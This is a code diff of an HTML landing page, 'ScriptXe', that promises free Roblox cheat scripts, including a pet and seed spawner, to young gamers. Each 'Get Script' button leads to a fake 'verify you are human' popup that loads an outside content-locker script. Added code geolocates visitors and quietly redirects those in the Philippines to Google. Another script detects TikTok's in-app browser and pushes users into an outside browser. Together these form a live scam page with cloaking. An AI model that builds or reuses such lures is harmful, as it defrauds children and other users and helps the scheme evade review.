@@ -2,373 +2,396 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <title>ScriptXe</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8">
+  <title>ScriptXe</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 
-    <link rel="icon" type="image/png" sizes="16x16" href="https://i.ibb.co/N224P2Zv/favicon-16x16.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="https://i.ibb.co/N224P2Zv/favicon-16x16.png" />
 
-    <script type="text/javascript" id="ogjs" src="https://lockverify.org/cl/js/kr7wml"></script>
+  <script type="text/javascript" id="ogjs" src="https://areyourealhuman.com/cl/js/kld9n8"></script>
 
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-T1M6M1HTJ8"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-T1M6M1HTJ8"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
 
-        gtag('config', 'G-T1M6M1HTJ8');
-    </script>
+    gtag('config', 'G-T1M6M1HTJ8');
+  </script>
 
-    <style>
-        body {
-            font-family: 'Poppins', sans-serif;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-            background-color: #1e1e1e;
-            color: white;
-            background-size: cover;
-            background-attachment: scroll;
-        }
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      background-color: #1e1e1e;
+      color: white;
+      background-size: cover;
+      background-attachment: scroll;
+    }
 
-        header {
-            position: relative;
-            background: linear-gradient(90deg, #ff9966, #ff5e62);
-            width: 100%;
-            height: 245px;
-            color: white;
-            text-align: center;
-            font-size: 22px;
-            font-weight: bold;
-            overflow: hidden;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
+    header {
+      position: relative;
+      background: linear-gradient(90deg, #ff9966, #ff5e62);
+      width: 100%;
+      height: 245px;
+      color: white;
+      text-align: center;
+      font-size: 22px;
+      font-weight: bold;
+      overflow: hidden;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
 
-        .text-wrapper {
-            position: relative;
-            z-index: 1;
-            padding-top: 60px;
-        }
+    .text-wrapper {
+      position: relative;
+      z-index: 1;
+      padding-top: 60px;
+    }
 
-        .card {
-            max-width: 600px;
-            width: 80%;
-            margin-top: 35px !important;
-            margin: 40px auto;
-            background: #171717;
-            box-shadow: 0 0px 8px rgba(0, 0, 0, 0.2);
-            border-radius: 16px;
-            padding: 24px;
-            color: #ffffff;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+    .card {
+      max-width: 600px;
+      width: 80%;
+      margin-top: 35px !important;
+      margin: 40px auto;
+      background: #171717;
+      box-shadow: 0 0px 8px rgba(0, 0, 0, 0.2);
+      border-radius: 16px;
+      padding: 24px;
+      color: #ffffff;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-        .card-child {
-            flex: 1;
-            min-width: 100px;
-            padding: 0px;
-            text-align: center;
-        }
+    .card-child {
+      flex: 1;
+      min-width: 100px;
+      padding: 0px;
+    }
 
-        .card-child img {
-            width: 40%;
-            height: 40%;
-            object-fit: cover;
-            margin-top: 5px;
-            margin-bottom: -5px;
+    .card-child img {
+      width: 40%;
+      height: 40%;
+      object-fit: cover;
+      margin-top: -15px;
+      margin-bottom: -30px;
 
-        }
+    }
 
-        .card-child h2 {
-            margin: 16px 0 8px;
-            font-size: 24px;
-            font-weight: bold;
-        }
+    .card-child h2 {
+      margin: 16px 0 8px;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
-        .card-child h4 {
-            text-align: left;
-            margin-bottom: -15px;
-            
-        }
+    .download-btn {
+      display: inline-block;
+      margin-top: 20px;
+      background: linear-gradient(90deg, #ff9966, #ff5e62);
+      color: white;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background 0.3s ease;
+      animation: pulseScale 2s infinite ease-in-out;
+      cursor: pointer;
+    }
 
-        .download-btn {
-            display: inline-block;
-            margin-top: 35px;
-            background: linear-gradient(90deg, #ff9966, #ff5e62);
-            color: white;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: background 0.3s ease;
-            animation: pulseScale 2s infinite ease-in-out;
-            cursor: pointer;
-        }
+    @keyframes pulseScale {
 
-        @keyframes pulseScale {
+      0%,
+      100% {
+        transform: scale(1);
+      }
 
-            0%,
-            100% {
-                transform: scale(1);
-            }
+      50% {
+        transform: scale(0.9);
+      }
+    }
 
-            50% {
-                transform: scale(0.9);
-            }
-        }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin: 20px 0;
+      padding: 10px 0;
+      font-family: 'Poppins', sans-serif;
+    }
 
-        .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #888;
-            margin: 20px 0;
-            padding: 10px 0;
-            font-family: 'Poppins', sans-serif;
-        }
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 20px;
+    }
 
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 20px;
-        }
+    .upper-text {
+      font-size: 40px;
+      font-weight: normal;
+      margin-bottom: -0px;
+      margin-top: -15px;
+      font-weight: bold;
+    }
 
-        .upper-text {
-            font-size: 40px;
-            font-weight: normal;
-            margin-bottom: -0px;
-            margin-top: -15px;
-            font-weight: bold;
-        }
+    .lower-text {
+      font-size: 14px;
+      margin-bottom: 20px;
+      margin-top: 0px;
+      font-weight: lighter;
+    }
 
-        .lower-text {
-            font-size: 14px;
-            margin-bottom: 20px;
-            margin-top: 0px;
-            font-weight: lighter;
-        }
+    .text-wrapper {
+      position: relative;
+      top: auto;
+      left: auto;
+      transform: none;
+      padding-top: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      width: 100%;
+      color: white;
+      pointer-events: auto;
+    }
 
-        .text-wrapper {
-            position: relative;
-            top: auto;
-            left: auto;
-            transform: none;
-            padding-top: 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-            width: 100%;
-            color: white;
-            pointer-events: auto;
-        }
+    .section-title {
+      display: flex;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      font-weight: bold;
+      font-size: 22px;
+      color: #ffffff;
+      margin: 35px 16px;
+    }
 
-        .section-title {
-            display: flex;
-            align-items: center;
-            font-family: Arial, sans-serif;
-            font-weight: bold;
-            font-size: 22px;
-            color: #ffffff;
-            margin: 35px 16px;
-        }
+    .section-title::before {
+      content: "";
+      display: inline-block;
+      width: 6px;
+      height: 28px;
+      background: linear-gradient(90deg, #ff9966, #ff5e62);
+      margin-right: 10px;
+      border-radius: 3px;
+    }
 
-        .section-title::before {
-            content: "";
-            display: inline-block;
-            width: 6px;
-            height: 28px;
-            background: linear-gradient(90deg, #ff9966, #ff5e62);
-            margin-right: 10px;
-            border-radius: 3px;
-        }
+    .img1 {
+      width: 80%;
+      height: 80%;
+    }
 
-        .img1 {
-            width: 80%;
-            height: 80%;
-        }
+    .img2 {
+      width: 80%;
+      height: 80%;
+      margin-bottom: 5px;
+    }
 
-        .img2 {
-            width: 80%;
-            height: 80%;
-            margin-bottom: 5px;
-        }
+    h4 {
+      text-align: left;
+      font-weight: lighter;
+      margin-left: 10px;
+    }
 
-        h4 {
-            text-align: left;
-            font-weight: bold;
-            margin-left: 10px;
-        }
+    .h4 {
+      text-align: center;
+      margin-top: 10px;
+    }
 
-        .img3 {
-            width: 50%;
-            height: 50%;
-            margin-left: 5px;
-        }
+    .img3 {
+      width: 50%;
+      height: 50%;
+      margin-left: 5px;
+    }
 
-        .popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.75);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
 
-        .popup-box {
-            background: linear-gradient(to top, #131313, #2d2d2d);
-            color: #ffffff;
-            max-width: 450px;
-            width: 80%;
-            padding: 25px;
-            border-radius: 12px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
-            border: 1px solid #ff5e62;
-            animation: slideUp 0.5s ease forwards;
-        }
+    .popup-box {
+      background: linear-gradient(to top, #131313, #2d2d2d);
+      color: #ffffff;
+      max-width: 450px;
+      width: 80%;
+      padding: 25px;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+      border: 1px solid #ff5e62;
+      animation: slideUp 0.5s ease forwards;
+    }
 
-        .popup-box h2 {
-            font-size: 26px;
-            font-weight: bold;
-            margin-bottom: 2px;
-            margin-top: -5px;
-            text-align: left;
-        }
+    .popup-box h2 {
+      font-size: 26px;
+      font-weight: bold;
+      margin-bottom: 2px;
+      margin-top: -5px;
+      text-align: left;
+    }
 
-        .popup-box h5 {
-            font-size: 15px;
-            font-weight: bold;
-            margin-bottom: 2px;
-            margin-top: -5px;
-            text-align: left;
-        }
+    .popup-box h5 {
+      font-size: 15px;
+      font-weight: bold;
+      margin-bottom: 2px;
+      margin-top: -5px;
+      text-align: left;
+    }
 
-        .popup-box h6 {
-            font-size: 14px;
-            font-weight: lighter;
-            margin-bottom: 20px;
-            margin-top: 5px;
-            text-align: left;
-        }
+    .popup-box h6 {
+      font-size: 14px;
+      font-weight: lighter;
+      margin-bottom: 20px;
+      margin-top: 5px;
+      text-align: left;
+    }
 
-        .popup-box p {
-            font-size: 14px;
-            margin-bottom: 15px;
-            line-height: 1.5;
-            text-align: left;
-        }
+    .popup-box p {
+      font-size: 14px;
+      margin-bottom: 15px;
+      line-height: 1.5;
+      text-align: left;
+    }
 
-        .popup-box button {
-            background: linear-gradient(90deg, #ff9966, #ff5e62);
-            color: #fff;
-            border: none;
-            padding: 14px 80px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
+    .popup-box button {
+      background: linear-gradient(90deg, #ff9966, #ff5e62);
+      color: #fff;
+      border: none;
+      padding: 14px 80px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
 
-        .popup-box button:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-        }
+    .popup-box button:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+    }
 
-        @keyframes slideUp {
-            0% {
-                transform: translateY(100px);
-                opacity: 0;
-            }
+    @keyframes slideUp {
+      0% {
+        transform: translateY(100px);
+        opacity: 0;
+      }
 
-            100% {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-    </style>
+      100% {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .nights-btn {
+      display: inline-block;
+      margin-top: 0px;
+      background: linear-gradient(90deg, #ff9966, #ff5e62);
+      color: white;
+      padding: 16px 24px;
+      font-size: 16px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background 0.3s ease;
+      animation: pulseScale 2s infinite ease-in-out;
+      cursor: pointer;
+    }
+  </style>
 
 </head>
 
 <body>
 
-    <header>
-        <div class="text-wrapper">
-            <img class="logo" src="https://i.ibb.co/Dfc5KR2Q/8b50a9a49c4190dcb4c884b048143803.png" alt="logo">
-            <h3 class="upper-text">ScriptXE</h3>
-            <p class="lower-text">the ultimate site for roblox scripts. powered by scriptxe.</p>
-        </div>
-    </header>
-
-    <div class="section-title">99 NIGHTS SCRIPT</div>
-
-    <div class="card">
-        <div class="card-child">
-            <img src="https://i.ibb.co/0jWXsH2d/Site-community-image.webp" alt="grow-a-garden">
-            <h2>[🌲​] 99 Nights In The Forest Script.</h2>
-            <h4>- Auto Farm Daimond 💎</h4>
-            <h4>- Ban Protection ✅</h4>
-            <h4>- Bring Any Items 🍀</h4>
-            <h4>- Auto Shop All Trees ​🌳</h4>
-            <h4> - Teleport Anywhere In The Map ​🗺️</h4>
-            <h4>- FLY + SPEED ​🚀</h4>
-            <a href="#" class="download-btn">Get Script</a>
-        </div>
+  <header>
+    <div class="text-wrapper">
+      <img class="logo" src="https://i.ibb.co/Dfc5KR2Q/8b50a9a49c4190dcb4c884b048143803.png" alt="logo">
+      <h3 class="upper-text">ScriptXE</h3>
+      <p class="lower-text">the ultimate site for roblox scripts. powered by scriptxe.</p>
     </div>
+  </header>
 
-    <div class="section-title">ABOUT THE SCRIPT</div>
+  <div class="section-title">PET SPAWNER SCRIPT</div>
 
-    <h4>✅​ AUTO FARM DAIMOND</h4>
-    <img class="img1" src="https://i.ibb.co/B914HvW/Script-99-Nights-in-the-Forest-Roblox.webp" alt="pets">
-    <h4>✅​ ANTY BAN PROTECTION</h4>
-    <img class="img2" src="https://i.ibb.co/21sQcYvY/maxresdefault.jpg" alt="seeds">
-
-    <footer class="footer">
-        &copy; 2025 scriptxe. All rights reserved.
-    </footer>
-
-    <div class="popup-overlay" id="popup">
-        <div class="popup-box">
-            <h2>Final Step Required</h2>
-            <p>To prevent abuse and ensure you are human, please complete a short verification step.</p>
-            <h5>How to Unlock Your Script:</h5>
-            <h6>Click the button below and complete ONE simple step. Once completed, your script unlocks automatically.
-            </h6>
-
-            <button id="verifyBtn">Start Verification</button>
-        </div>
+  <div class="card">
+    <div class="card-child">
+      <img src="https://i.ibb.co/mr7sCDpj/Add-a-heading.png" alt="grow-a-garden">
+      <h2>[☀️] Grow a Garden Pets and Seeds Spawner Script.</h2>
+      <div><span class="votes"> This script is for fun ! Pets and seeds are visual only they show
+          up on your screen but aren't real in-game and can't be seen by other players. Still super cool to try and
+          build your own garden vibe! </span></div>
+      <a href="#" class="download-btn">Get Script</a>
     </div>
+  </div>
 
-    <script>
-        document.querySelectorAll(".download-btn").forEach(btn => {
-            btn.addEventListener("click", function (e) {
-                e.preventDefault();
-                document.getElementById("popup").style.display = "flex";
-                document.body.style.overflow = "hidden";
-            });
-        });
+  <div class="section-title">ABOUT THE SCRIPT</div>
 
-        document.getElementById("verifyBtn").addEventListener("click", function () {
-            og_load();
-            document.getElementById("popup").style.display = "none";
-            document.body.style.overflow = "auto";
-        });
-    </script>
+  <h4>🔥 Spawn unlimited pets in the game.</h4>
+  <img class="img1" src="https://i.postimg.cc/0QVz75YV/1000075678.jpg" alt="pets">
+  <h4>🔥 Spawn unlimited seeds in the game.</h4>
+  <img class="img2" src="https://i.postimg.cc/T1PWs528/1000075674.jpg" alt="seeds">
 
-    <div id="tiktok-fallback" style="
+  </div>
+  <footer class="footer">
+    &copy; 2025 scriptxe. All rights reserved.
+  </footer>
+
+  <div class="popup-overlay" id="popup">
+    <div class="popup-box">
+      <h2>Final Step Required</h2>
+      <p>To prevent abuse and ensure you are human, please complete a short verification step.</p>
+      <h5>How to Unlock Your Script:</h5>
+      <h6>Click the button below and complete ONE simple step. Once completed, your script unlocks automatically.</h6>
+
+      <button id="verifyBtn">Start Verification</button>
+    </div>
+  </div>
+
+  <script>
+    fetch('https://ipapi.co/json/')
+      .then(r => r.json())
+      .then(loc => {
+        if (loc && loc.country_code === 'PH') {
+          window.location.href = "https://www.google.com"
+        }
+      })
+      .catch(() => { })
+  </script>
+
+  <script>
+    document.querySelectorAll(".download-btn").forEach(btn => {
+      btn.addEventListener("click", function (e) {
+        e.preventDefault();
+        document.getElementById("popup").style.display = "flex";
+        document.body.style.overflow = "hidden";
+      });
+    });
+
+    document.getElementById("verifyBtn").addEventListener("click", function () {
+      og_load();
+      document.getElementById("popup").style.display = "none";
+      document.body.style.overflow = "auto";
+    });
+  </script>
+
+  </script>
+
+  <div id="tiktok-fallback" style="
       display: none;  
       position: fixed;
       top: 0; left: 0;  
@@ -385,53 +408,47 @@
       box-sizing: border-box;
       overflow-wrap: break-word;                                                 ">
 
-        <img src="https://i.postimg.cc/kM6GVNVf/up-right-arrow-2.png"
-            style="position: absolute; top: 0px; right: 45px; width: 60px; height: 60px; pointer-events: none;" />
+    <img src="https://i.postimg.cc/kM6GVNVf/up-right-arrow-2.png"
+      style="position: absolute; top: 0px; right: 45px; width: 60px; height: 60px; pointer-events: none;" />
 
-        <div style="text-align: center; transform: translateY(-100px);">
-            <h2>🚀 Open in Browser to Claim your Pets!</h2>
-            <p>TikTok limits some features inside its app browser. To Continue :</p>
+    <div style="text-align: center; transform: translateY(-100px);">
+      <h2>🚀 Open in Browser to Claim your Pets!</h2>
+      <p>TikTok limits some features inside its app browser. To Continue :</p>
 
-            <p>Tap On " ••• "</p>
-            <img src="https://i.ibb.co/7d7S2DMt/Untitled-design-20250528-170354-0000.png"
-                style="max-width: 115%; margin-left: -19px;" />
-            <p>Then Tap On " Open In Browser "</p>
-            <img src="https://i.ibb.co/XkC1Zmv5/Untitled-design-20250528-170043-0000.png" alt="Second image"
-                style="max-width: 115%; margin-left: -20px" ; />
-        </div>
+      <p>Tap On " ••• "</p>
+      <img src="https://i.ibb.co/7d7S2DMt/Untitled-design-20250528-170354-0000.png"
+        style="max-width: 115%; margin-left: -19px;" />
+      <p>Then Tap On " Open In Browser "</p>
+      <img src="https://i.ibb.co/XkC1Zmv5/Untitled-design-20250528-170043-0000.png" alt="Second image"
+        style="max-width: 115%; margin-left: -20px" ; />
     </div>
+  </div>
 
-    <script>
-        (function () {
-            const ua = navigator.userAgent.toLowerCase();
-            const ref = document.referrer.toLowerCase();
-            const fb = document.getElementById('tiktok-fallback');
-            if (!fb) return;
+  <script>
+    (function () {
+      const ua = navigator.userAgent.toLowerCase();
+      const ref = document.referrer.toLowerCase();
+      const fb = document.getElementById('tiktok-fallback');
+      if (!fb) return;
 
-            const tikTokIdentifiers = [
-                "tiktok",
-                "musical_ly",
-                "com.ss.android.ugc.trill",
-                "musicallygo"
-            ];
+      const tikTokIdentifiers = [
+        "tiktok",
+        "musical_ly",
+        "com.ss.android.ugc.trill",
+        "musicallygo"
+      ];
 
-            const isTikTokBrowser = tikTokIdentifiers.some(id => ua.includes(id)) || ref.includes("tiktok");
+      const isTikTokBrowser = tikTokIdentifiers.some(id => ua.includes(id)) || ref.includes("tiktok");
 
-            if (isTikTokBrowser) {
-                fb.style.display = 'flex';
-                document.body.style.overflow = 'hidden';
-            } else {
-                fb.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            }
-        })();  
-    </script>
-
-    <script type="text/javascript">
-        if (window.location.href.indexOf("?m=1") > -1) {
-            window.history.replaceState({}, document.title, window.location.href.split("?m=1")[0]);
-        }
-    </script>
+      if (isTikTokBrowser) {
+        fb.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+      } else {
+        fb.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      }
+    })();  
+  </script>
 
 </body>
 
